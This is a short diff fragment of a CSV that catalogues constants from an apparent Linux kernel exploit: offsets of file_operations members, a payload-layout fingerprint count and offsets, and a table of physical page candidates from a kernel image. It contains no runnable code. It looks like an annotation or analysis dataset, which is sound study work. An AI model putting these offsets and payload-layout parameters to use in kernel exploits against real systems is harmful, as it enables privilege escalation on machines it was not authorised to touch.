+FOPS_SPLICE_READ_OFF,0xc8,target.h,290,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_SHOW_FDINFO_OFF,0xe0,target.h,291,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+P0_FINGERPRINT_H,,p0_fingerprint.h,4,UNKNOWN,SOURCE_CODE,Header include guard macro
+P0_FINGERPRINT_WORDS,8,p0_fingerprint.h,6,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+p0_fingerprint_offsets,"{ 0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00 }",p0_fingerprint.h,8,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+p0_fingerprints,struct p0_fingerprint array [32 entries],p0_fingerprint.h,17,FIRMWARE_FINGERPRINT,DISASSEMBLY,Lookup table of 32 physical page candidate samples from Image
